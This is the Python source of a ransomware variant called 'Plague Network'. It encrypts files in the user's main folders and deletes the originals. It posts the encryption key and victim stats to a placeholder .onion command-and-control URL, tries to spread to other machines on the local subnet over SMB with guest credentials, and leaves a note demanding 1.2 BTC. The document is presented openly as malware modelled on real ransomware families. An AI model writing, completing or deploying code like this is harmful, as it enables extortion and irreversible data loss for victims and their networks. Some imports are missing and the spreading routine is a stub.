'''Variant 3 – "Plague Network" (Worm-like Propagation + C2)
Philosophy
Self-spreading across local network (SMB shares, RDP creds if available). Reports back to C2 with victim list, key material, encrypted file count. Classic modern ransomware behavior (think Conti / LockBit style).'''
# Plague Network - worm-ransomware with C2 beacon
import socket
import requests
from cryptography.fernet import Fernet
from pathlib import Path
import secrets
import os
import smbclient  # pip install smbprotocol

C2_URL = "https://your-c2-domain.onion/beacon"  # replace

KEY = Fernet.generate_key()
cipher = Fernet(KEY)

def exfil_key_and_stats(stats: dict):
    try:
        payload = {
            "victim_id": secrets.token_hex(12),
            "key": KEY.decode(),
            "stats": stats,
            "timestamp": str(time.time())
        }
        requests.post(C2_URL, json=payload, timeout=8, verify=False)
    except:
        pass

def encrypt_and_count(root: Path):
    count = 0
    for file in root.rglob("*.*"):
        if file.is_file() and file.suffix not in {".exe",".dll",".sys",".enc"}:
            try:
                data = file.read_bytes()
                enc = cipher.encrypt(data)
                file.with_suffix(file.suffix + ".plague").write_bytes(enc)
                file.unlink()
                count += 1
            except:
                pass
    return count

def try_spread():
    # Naive SMB spread example — expand with credential dumping in real impl
    local_ip = socket.gethostbyname(socket.gethostname())
    subnet = ".".join(local_ip.split(".")[:3])
    for i in range(1, 255):
        target = f"{subnet}.{i}"
        try:
            with smbclient.SambaClient(server=target, username="guest", password=""):
                # If accessible → copy self + execute (highly simplified)
                pass
        except:
            pass

def main():
    stats = {"files_encrypted": 0, "dirs_hit": 0}
    user_root = Path.home()

    for folder in ["Desktop", "Documents", "Downloads", "OneDrive"]:
        p = user_root / folder
        if p.exists():
            stats["files_encrypted"] += encrypt_and_count(p)
            stats["dirs_hit"] += 1

    exfil_key_and_stats(stats)

    # Attempt lateral movement
    threading.Thread(target=try_spread, daemon=True).start()

    # Leave visible note only after spread attempt
    note = user_root / "PLAGUE_HAS_ARRIVED.txt"
    note.write_text(f"Plague Network\nPay 1.2 BTC\nVictim ID: {stats.get('victim_id','unknown')}")

if __name__ == "__main__":
    main()